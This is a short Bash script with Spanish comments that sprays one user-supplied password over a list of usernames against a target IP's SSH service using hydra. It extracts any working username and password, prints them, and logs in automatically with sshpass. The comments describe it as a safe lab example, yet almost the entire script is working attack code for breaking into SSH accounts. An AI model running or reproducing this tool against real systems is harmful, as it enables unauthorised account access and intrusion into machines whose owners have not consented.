#!/bin/bash

# Pedir datos
read -p "Introduce La Contraseña : " pass
read -p "Introduce la IP: " ip

# Mostrar lo que se va a ejecutar (ejemplo seguro)
echo "Ejecutando prueba con contraseña: $pass en IP: $ip"

# Aquí puedes poner un comando legítimo de tu laboratorio
# Ejemplo: comprobar conectividad SSH

resultado=$(hydra -L ~/diccionarios/contraseñas/usuarios.txt -p $pass ssh://$ip)

linea=$(echo "$resultado" | grep "login:")

# ❌ Si no hay resultado
if [ -z "$linea" ]; then
    echo "El Ataque No Fue Exitoso: no se encontraron credenciales"
    exit 1
fi

# ✅ Si sí hay resultado, extraer datos
usuario=$(echo "$linea" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
password=$(echo "$linea" | sed -n 's/.*password: \(.*\)/\1/p')

echo "Usuario encontrado: $usuario"
echo "Password encontrada: $password"


sshpass -p $password ssh $usuario@$ip
